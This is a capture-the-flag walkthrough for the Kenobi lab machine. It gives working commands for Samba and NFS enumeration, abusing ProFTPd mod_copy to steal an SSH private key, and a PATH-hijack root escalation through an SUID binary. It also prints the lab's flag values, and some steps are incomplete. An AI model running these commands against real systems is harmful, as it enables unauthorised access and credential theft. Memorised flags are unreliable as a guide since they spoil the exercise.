# KENOBI
Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation. 
------------------

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

SMB has two ports, 445 and 139.

1. Scan the machine with nmap, how many ports are open?
```
nmap -sV <target>
```
2. Using the nmap command above, how many shares have been found?

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target>
```
3. What mount can we see?
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <target>
```
4. What is the version? **ProFtpd**
```
nc <target> 21 #port
```
5. How many exploits are there for the ProFTPd running?
```
searchsploit proftpd 1.3.5
```
From the exploit found, The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server.
Since we knew the mount directory on target, we copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

```
nc <target> 21 #connect to ftp port
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```
6. Mount the /var/tmp directory to our machine
```
mkdir /mnt/kenobiNFS
mount 10.10.43.114:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```
Logging in 
```
cp
```
Kenobi user flag
d0b0f3f53b6caa532a83915e19224899

7. Priviledge Escalation with Variable Manipulation
This is achieved by running binaries and escalation by using SUID
What file looks particularly out of the ordinary?
```
/usr/bin/menu
```
8. Run the binary, how many options appear?
3
9. Flag in root.txt
This file runs as the root users privileges, we can manipulate our path gain a root shell.
```
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu

********************
** choice:1
#cat /root/root.txt
177b3cd8562289f37382721c28381f02
```
We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!